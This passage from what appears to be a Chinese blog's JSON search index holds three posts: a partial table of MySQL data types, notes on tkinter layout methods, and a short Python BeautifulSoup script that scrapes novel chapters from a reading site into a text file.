‘-838:59:59’ 到 ‘838:59:59’ YEAR() 2 位或 4 位格式的年。 // 注释：4 位格式所允许的值：1901 到 2155。2 位格式所允许的值：70 到 69，表示从 1970 到 2069。 Text类型 数据类型 描述 CHAR(size) 保存固定长度的字符串（可包含字母、数字以及特殊字符）。在括号中指定字符串的长度。最多 255 个字符。 VARCHAR(size) 保存可变长度的字符串（可包含字母、数字以及特殊字符）。在括号中指定字符串的最大长度。最多 255 个字符。 // 注释：如果值的长度大于 255，则被转换为 TEXT 类型。 TINYTEXT 存放最大长度为 255 个字符的字符串。 TEXT 存放最大长度为 65,535 个字符的字符串。 BLOB 用于 BLOBs (Binary Large OBjects)。存放最多 65,535 字节的数据。 MEDIUMTEXT 存放最大长度为 16,777,215 个字符的字符串。 MEDIUMBLOB 用于 BLOBs (Binary Large OBjects)。存放最多 16,777,215 字节的数据。 LONGTEXT 存放最大长度为 4,294,967,295 个字符的字符串。 LONGBLOB 用于 BLOBs (Binary Large OBjects)。存放最多 4,294,967,295 字节的数据。 ENUM(x,y,z,etc.) 允许你输入可能值的列表。可以在 ENUM 列表中列出最大 65535 个值。如果列表中不存在插入的值，则插入空值。//注释：这些值是按照你输入的顺序存储的。可以按照此格式输入可能的值：ENUM(‘X’,’Y’,’Z’) SET 与 ENUM 类似，SET 最多只能包含 64 个列表项，不过 SET 可存储一个以上的值。","categories":[{"name":"资料","slug":"资料","permalink":"http://chaosec.top/categories/资料/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://chaosec.top/tags/SQL/"}]},{"title":"tkinter","slug":"tkinter","date":"2017-12-20T12:19:54.000Z","updated":"2018-02-09T14:08:20.524Z","comments":true,"path":"2017/12/20/tkinter/","link":"","permalink":"http://chaosec.top/2017/12/20/tkinter/","excerpt":"最近程序设计课我不知道为什么鬼使神差的使用python的tkinter库开发了gui程序，虽然过程很多波折，但是还是学到了不少东西的，特地把一些东西记录一下。","text":"最近程序设计课我不知道为什么鬼使神差的使用python的tkinter库开发了gui程序，虽然过程很多波折，但是还是学到了不少东西的，特地把一些东西记录一下。 简单开始1234from tkinter import *root = Tk()root.title(&quot;start&quot;)root.mainloop() 参考文档 该模块中对于控件的放置支持三种方法 pack方法 pack的放置是基于块的思想来实现的，每一个块放置后系统会自动填充到目标窗体中，可以通过属性来改变其放置的位置，属于tkinter中比较常用的一种方法。注意frame控件属于pack()方法的内容，不能够和其它方法混用。 常用参数： 参数 说明 anchor 设置对齐方式，以地理坐标的方式，参数有E,W,N,S(东南西北),EN,ES,WE,WS,W+E+S+N fill 填充方向，可以选择X方向，Y方向，BOTH指两个方向都包含 expand 设置是否扩充 ipadx x内边距 ipady y内边距 padx x外边距 pady y外边距 side 放置大致方位 grid方法 grid方法对于控件的放置是基于表格的形式来放置，但是通过row，column选项可以控制控件的位置，注意row或者column选项值相等的控件会水平或竖直对齐。 place方法 该方法通过指定在屏幕上的x，y值来控制控件的位置，可以实现非常精确的控制，但是这种方法编写非常复杂，所以不推荐这种方法。 注意：这三种方法不能再一个窗口中混用，尤其是pack和grid方法，如果混用会报错。而且会导致控件放置错乱。 对于treeview视图，贴个网址，我感觉就应该足够了点我 后记本来一片雄心想大写特写，然而，理想很丰满，现实很骨感，还是没写多少东西，不过感觉也差不多够用了(#^.^#)。","categories":[{"name":"资料","slug":"资料","permalink":"http://chaosec.top/categories/资料/"}],"tags":[{"name":"tkinter","slug":"tkinter","permalink":"http://chaosec.top/tags/tkinter/"}]},{"title":"Spider攻城记","slug":"spider1","date":"2017-12-15T04:08:02.000Z","updated":"2018-07-31T01:57:19.888Z","comments":true,"path":"2017/12/15/spider1/","link":"","permalink":"http://chaosec.top/2017/12/15/spider1/","excerpt":"刚刚起步，先来点东西水一水…","text":"刚刚起步，先来点东西水一水… 为什么要干这个呢 最近突然想看《细说隋唐》，但是网上找资源很难找，好不容易找到一个在线阅读网站但是这个网站的页面不能自动适应手机界面，很烦，而且不能自动切换到下一章，每一次都得返回目录页找下一章，而且页面上还有广告QAQ~~…总之不舒服，于是突发奇想做个爬虫（spider）把内容爬下来，然后导入手机观看，这样岂不是很有逼格？！说干就干。 目标网址Link 工具 python、掌阅（一款电子书APP）、python包BeautifulSoup4 分析URL 每个具体章节例如第5章http://www.saohua.com/shuku/xishuosuitang/ldf06.htm，发现第i章URL为http://www.saohua.com/shuku/xishuosuitang/ldfi-5.htm 开始攻城 既然规律找到了那么接下来就好办了，这里还有一个问题，掌阅可以自动生成目录，其实是把你的txt文件中的第几回第几章等自动生成，所以文件里要有第几章所以加了一段转换代码生成”第几章”字样，贴一下代码。12345678910111213141516171819202122import urllib.request as ufrom bs4 import BeautifulSoup f=open('a.txt','w+')for i in range(22,111): url=\"http://www.saohua.com/shuku/xishuosuitang/ldf\"+str(i)+\".htm\" res=u.urlopen(url) html=res.read().decode('gbk') soup = BeautifulSoup(html,'lxml') for col in range(2): for data in soup.find_all('font')[col]: if(data.string!='HTMLBUILERPART0' and data.string!='/HTMLBUILERPART0'): if(data.string==None): f.write('\\n') elif(str(i-5) in data.string): f.write('第'+str(i-5)+'回:'+data.string) else: f.write(data.string)f.close() 运行一下，大概三四秒钟… C:\\Users\\xxx\\Desktop&gt;python spider.py 导入手机这部分大家应该都会吧，打开掌阅导入一下就可以看了。 填坑总结1.好好学英语吧，BeautifulSoup官方文档是靠着Google浏览器自动翻译的，研究了半天。2.还有需要注意文字编码问题。3.由于这个网站没有屏蔽爬虫，所以简单代码就可以。4.{%raw%}{%endraw%}可以使输入的文本不被解析。","categories":[{"name":"教程","slug":"教程","permalink":"http://chaosec.top/categories/教程/"}],"tags":[{"name":"Spider","slug":"Spider","permalink":"http://chaosec.top/tags/Spider/"},{"name":"Python","slug":"Python","permalink":"http://chaosec.top/tags/Python/"}]}]}